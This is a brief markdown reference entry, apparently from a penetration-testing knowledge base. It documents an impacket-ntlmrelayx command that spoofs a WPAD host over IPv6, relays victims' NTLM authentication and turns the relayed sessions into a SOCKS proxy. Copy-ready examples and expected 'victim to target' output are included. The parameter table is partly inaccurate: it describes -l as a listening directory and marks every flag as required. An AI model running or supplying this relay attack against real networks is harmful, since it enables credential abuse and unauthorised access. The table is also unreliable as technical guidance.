---
type: command
executor: bash
data: impacket-ntlmrelayx -6 -wh $_WPAD_HOST -l $_LISTEN_DIR -socks -debug
output: null
platforms:
  - Linux
tags:
  - ntlm
  - relay
  - socks
verified: true
validated: true
---

# impacket-ntlmrelayx-create-socks-proxy

## Command

```bash
impacket-ntlmrelayx -6 -wh $_WPAD_HOST -l $_LISTEN_DIR -socks -debug
```

## Description

This command configures the NTLM relay server to create a SOCKS proxy from relayed connections, with debug output for monitoring authentication and relay attempts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -6 | Enable IPv6 mode | Yes |
| -wh $_WPAD_HOST | IP of WPAD host to spoof | Yes |
| -l $_LISTEN_DIR | Directory to listen for relayed connections | Yes |
| -socks | Enable SOCKS4/5 proxy | Yes |
| -debug | Verbose debug output | Yes |

## Examples

### Basic Usage

```bash
impacket-ntlmrelayx -6 -wh 192.168.1.100 -l /tmp -socks -debug
```

### Advanced Usage

```bash
impacket-ntlmrelayx -6 -wh 192.168.1.100 -l /tmp -socks -debug -tf relay.txt
```

## Expected Output

Proxy ready:

[*] SOCKS server listening on 127.0.0.1:1080
[*] Relayed connection from victim to target established

Debug logs show auth details and proxy traffic.

## Related

- [[procedures/SMB-NTLM-Relay-Attack-via-IPv6-with-Disabled-Signing]]
- [[tools/Impacket]]
